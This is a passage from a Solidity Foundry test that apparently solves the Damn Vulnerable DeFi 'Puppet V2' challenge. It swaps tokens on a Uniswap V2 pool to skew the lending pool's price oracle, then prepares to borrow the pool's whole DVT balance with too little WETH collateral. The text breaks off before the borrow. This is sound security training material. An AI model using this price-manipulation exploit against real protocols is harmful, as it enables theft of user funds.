...
contract PuppetV2Challenge is Test {
    ...
    function test_puppetV2() public checkSolvedByPlayer {
        ...
        // Approve uniswapV2Router to transfer 10,000 DVT
        token.approve(address(uniswapV2Router), PLAYER_INITIAL_TOKEN_BALANCE);

        // Token path addresses
        address[] memory path = new address[](2);
        path[0] = address(token); // Token to trade
        path[1] = uniswapV2Router.WETH(); // Token desired

        // Swap 10,000 DVT for ETH in the Uniswap V2 pool
        uniswapV2Router.swapExactTokensForETH(PLAYER_INITIAL_TOKEN_BALANCE, 0, path, player, block.timestamp);
        
        // Wrap ETH into WETH
        weth.deposit{value: player.balance}();

        // Query the pool calculation function for the exact WETH required to borrow 1,000,000 DVT
        uint256 amount = lendingPool.calculateDepositOfWETHRequired(POOL_INITIAL_TOKEN_BALANCE);

        // Approve lendingPool to spend required WETH collateral to borrow 1,000,000 DVT
